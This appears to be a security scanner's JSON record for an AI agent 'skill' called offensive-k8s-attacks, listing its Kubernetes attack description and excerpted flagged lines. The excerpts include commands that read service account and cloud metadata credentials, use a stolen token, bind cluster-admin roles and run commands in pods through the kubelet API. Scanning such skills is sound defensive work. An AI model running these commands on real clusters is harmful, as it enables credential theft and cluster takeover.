@@ -1,0 +1,527 @@
+{
+  "id": "snailsploit__claude-red__skills~container~offensive-k8s-attacks",
+  "owner": "SnailSploit",
+  "repo": "Claude-Red",
+  "path": "Skills/container/offensive-k8s-attacks",
+  "name": "offensive-k8s-attacks",
+  "description": "Kubernetes cluster attack techniques covering the full attack lifecycle from initial foothold in a pod to cluster-wide compromise. Covers service account token theft and impersonation, RBAC misconfiguration exploitation including wildcard permissions and privilege escalation via role binding, direct etcd access for secret extraction, kubelet API abuse on port 10250 and read-only port 10255, pod escape via hostPID hostNetwork and hostPath volume mounts, Kubernetes secrets enumeration and decoding, admission controller bypass techniques, network policy bypass and lateral movement, cloud metadata service access from pods for credential theft on AWS EKS GCP GKE and Azure AKS, CRD and operator abuse for persistence, and node compromise via DaemonSet deployment. Tools include kubectl, kube-hunter, peirates, kubeaudit, kdigger, kubeletctl. Maps to MITRE ATT&CK T1609 Container Administration Command, T1610 Deploy Container, T1613 Container and Resource Discovery. Use this skill when assessing Kubernetes clusters, attacking from within a compromised pod, exploiting RBAC or kubelet misconfigurations, or performing cloud-native lateral movement.",
+  "stars": 10468,
+  "category": "devops",
+  "commit": "a8de813edc9f66f60d44cfe42d47750e89d9930b",
+  "contentHash": "be0f92f0ad401fbb06cf3f65401c86cecee90f1db60c4ef885a26919a103df89",
+  "repoCreatedAt": "2026-03-04T05:52:35Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-07T16:26:42.053Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 27,
+        "excerpt": "ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 52,
+        "excerpt": "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 57,
+        "excerpt": "curl -s --cacert ${CACERT} -H \"Authorization: Bearer ${TOKEN}\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 57,
+        "excerpt": "curl -s --cacert ${CACERT} -H \"Authorization: Bearer ${TOKEN}\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 62,
+        "excerpt": "curl -s --cacert ${CACERT} -H \"Authorization: Bearer ${TOKEN}\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 62,
+        "excerpt": "curl -s --cacert ${CACERT} -H \"Authorization: Bearer ${TOKEN}\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 69,
+        "excerpt": "-d \"{\\\"apiVersion\\\":\\\"authentication.k8s.io/v1\\\",\\\"kind\\\":\\\"TokenReview\\\",\\\"spec\\\":{\\\"token\\\":\\\"${TOKEN}\\\"}}\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 76,
+        "excerpt": "kube-hunter --active --remote $APISERVER",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 104,
+        "excerpt": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 127,
+        "excerpt": "kubectl --token=\"$STOLEN_TOKEN\" --server=\"$APISERVER\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 127,
+        "excerpt": "kubectl --token=\"$STOLEN_TOKEN\" --server=\"$APISERVER\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 149,
+        "excerpt": "kubectl get clusterroles -o json | python3 -c \"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 187,
+        "excerpt": "kubectl create clusterrolebinding pwn-binding \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 237,
+        "excerpt": "curl -s http://NODE_IP:10255/pods | python3 -m json.tool",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "node_ip"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 237,
+        "excerpt": "curl -s http://NODE_IP:10255/pods | python3 -m json.tool",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 238,
+        "excerpt": "curl -s http://NODE_IP:10255/spec/",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "node_ip"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 239,
+        "excerpt": "curl -s http://NODE_IP:10255/metrics",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "node_ip"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 243,
+        "excerpt": "curl -sk https://NODE_IP:10250/pods \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "node_ip"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 244,
+        "excerpt": "-H \"Authorization: Bearer ${TOKEN}\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 247,
+        "excerpt": "curl -sk https://NODE_IP:10250/runningpods/ \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "node_ip"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 248,
+        "excerpt": "-H \"Authorization: Bearer ${TOKEN}\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 255,
+        "excerpt": "kubeletctl -s NODE_IP pods",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 259,
+        "excerpt": "curl -sk https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "node_ip"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 260,
+        "excerpt": "-H \"Authorization: Bearer ${TOKEN}\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 264,
+        "excerpt": "curl -sk https://NODE_IP:10250/runningpods/ \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "node_ip"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 265,
+        "excerpt": "-H \"Authorization: Bearer ${TOKEN}\" | \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 278,
+        "excerpt": "curl -sk \"https://NODE_IP:10250/containerLogs/NAMESPACE/POD/CONTAINER\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "node_ip"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 279,
+        "excerpt": "-H \"Authorization: Bearer ${TOKEN}\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 290,
+        "excerpt": "ps aux  # Shows host processes",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 314,
+        "excerpt": "ip addr show  # Shows host network interfaces",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 317,
+        "excerpt": "curl -s http://127.0.0.1:10255/pods  # Kubelet read-only",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 318,
+        "excerpt": "curl -sk https://127.0.0.1:10250/pods  # Kubelet API",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 319,
+        "excerpt": "curl -s http://127.0.0.1:2379/version  # etcd (if exposed)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 322,
+        "excerpt": "curl -s http://169.254.169.254/latest/meta-data/  # AWS",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 323,
+        "excerpt": "curl -s -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/  # GCP",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 324,
+        "excerpt": "curl -s -H \"Metadata: true\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"  # Azure",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 328,
+        "excerpt": "timeout 1 bash -c \"echo >/dev/tcp/127.0.0.1/$port\" 2>/dev/null && echo \"Port $port open\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 344,
+        "excerpt": "mount | grep -v overlay",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 363,
+        "excerpt": "cat <<'EOF' | kubectl apply -f -",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 404,
+        "excerpt": "kubectl get secrets -A",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 444,
+        "excerpt": "curl -s http://ETCD_IP:2379/version",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "etcd_ip"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 444,
+        "excerpt": "curl -s http://ETCD_IP:2379/version",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 445,
+        "excerpt": "curl -s http://127.0.0.1:2379/version  # From host network",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 485,
+        "excerpt": "curl -s http://169.254.169.254/latest/meta-data/",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 485,
+        "excerpt": "curl -s http://169.254.169.254/latest/meta-data/",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 486,
+        "excerpt": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 492,
+        "excerpt": "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 497,
+        "excerpt": "cat $AWS_WEB_IDENTITY_TOKEN_FILE",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 504,
+        "excerpt": "--web-identity-token \"$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 515,
+        "excerpt": "curl -s -H \"Metadata-Flavor: Google\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 527,
+        "excerpt": "curl -s -H \"Authorization: Bearer $ACCESS_TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 539,
+        "excerpt": "curl -s -H \"Metadata: true\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 551,
+        "excerpt": "curl -s -H \"Authorization: Bearer $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 563,
+        "excerpt": "kubectl get validatingwebhookconfigurations",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "Skills/container/offensive-k8s-attacks/SKILL.md",
+        "line": 776,
+        "excerpt": "curl -sk https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER -d \"cmd=id\" -H \"Authorization: Bearer $TOKEN\"",
+        "disclosed": true,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 24,
+      "reads-secrets": 15,
+      "network": 38
+    },
+    "score": 84,
+    "band": "low",
+    "rulesVersion": "1.2.0",
+    "filesScanned": 1,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "a8de813edc9f66f60d44cfe42d47750e89d9930b",
+      "scannedAt": "2026-11-07T16:26:42.053Z",
+      "score": 84,
+      "rulesVersion": "1.2.0"
+    }
+  ]
+}
